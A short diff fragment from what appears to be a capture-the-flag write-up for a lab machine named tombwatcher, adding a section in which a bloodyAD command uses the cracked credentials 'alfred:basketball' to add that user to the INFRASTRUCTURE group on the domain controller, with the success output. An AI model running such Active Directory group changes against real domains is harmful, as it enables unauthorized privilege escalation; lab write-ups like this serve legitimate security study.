@@ -297,6 +297,13 @@ Stopped: Thu Sep 24 03:57:20 2026
 
 `alfred:basketball`
 
+## adding alfred to infrastructure
+
+```
+ bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred                
+[+] alfred added to INFRASTRUCTURE
+```
+
 ---
 ## User Flag
 
